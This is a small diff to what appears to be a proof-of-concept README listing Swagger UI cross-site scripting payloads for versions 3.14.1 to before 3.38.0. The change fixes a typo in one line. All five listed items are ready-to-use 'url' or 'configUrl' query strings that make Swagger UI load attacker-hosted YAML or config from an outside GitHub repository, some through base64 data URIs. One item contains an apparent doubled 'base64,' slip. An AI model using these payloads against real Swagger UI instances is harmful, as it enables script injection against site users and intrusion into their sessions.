@@ -5,7 +5,7 @@ Swagger UI version affected: `>=3.14.1` &lt; `3.38.0`
 
 1. `?url=https://raw.githubusercontent.com/aydilfahri/swagger-ui-xss/main/xss-domain.yaml`
 2. `?url=https://raw.githubusercontent.com/aydilfahri/swagger-ui-xss/main/xss-fetch.yaml`
-3. `??configUrl=https://raw.githubusercontent.com/aydilfahri/swagger-ui-xss/main/config.json`
+3. `?configUrl=https://raw.githubusercontent.com/aydilfahri/swagger-ui-xss/main/config.json`
 4. `?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2F5ZGlsZmFocmkvc3dhZ2dlci11aS14c3MvbWFpbi94c3MtZmV0Y2gueWFtbCIKfQ==`
 5. `/classicapi/doc/?configUrl=data:text/html;base64,base64,ewoidXJsIjoiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2F5ZGlsZmFocmkvc3dhZ2dlci11aS14c3MvbWFpbi94c3MtZmV0Y2gueWFtbCIKfQ==`
 
